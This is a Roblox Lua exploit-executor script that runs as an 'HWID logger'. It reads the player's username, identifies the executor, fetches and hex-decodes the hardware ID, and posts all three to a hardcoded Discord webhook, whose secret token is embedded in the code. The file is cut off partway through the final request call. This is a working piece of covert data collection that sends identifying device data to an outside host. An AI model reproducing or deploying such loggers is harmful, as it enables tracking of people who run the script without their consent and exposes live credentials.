local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Detect executor
local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"

-- Try to get HWID (executor-dependent)
local hwid = "Unknown"
if gethwid then
    hwid = gethwid()
elseif hwid then
    hwid = hwid
elseif get_genv and get_genv().hwid then
    hwid = get_genv().hwid
end

-- Hex decode function
local function hexToString(hex)
    if not hex or #hex % 2 ~= 0 then return "Invalid Hex" end
    local str = ""
    for i = 1, #hex, 2 do
        local byte = tonumber(hex:sub(i, i+1), 16)
        if byte then
            str = str .. string.char(byte)
        else
            return "Invalid Byte in Hex"
        end
    end
    return str
end

-- Try decoding HWID
local decodedHWID = hwid
if hwid:match("^[0-9a-fA-F]+$") then
    local success, result = pcall(function()
        return hexToString(hwid)
    end)
    if success then
        decodedHWID = result
    else
        decodedHWID = "Failed to decode"
    end
else
    decodedHWID = "Not hex format"
end

-- Build Discord embed
local embed = {
    ["embeds"] = {{
        ["title"] = "Exploit Script Executed",
        ["color"] = 15844367,
        ["fields"] = {
            {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "HWID", ["value"] = decodedHWID, ["inline"] = false},
          
        },
        ["footer"] = {["text"] = "HWID Logger (Decoded Test)"},
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
}

-- Send to Discord webhook
local request = http_request or request or syn.request or fluxus.request or http and http.request

request({
    Url = "https://discord.com/api/webhooks/1357403916253266101/z0s7i2kdN4GL-o0Zq8ERQ-bEq6PWkA_8zH-q7RX7wB9Paa-w-ET72DrusXxwt8Rj-_VW",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(embed)
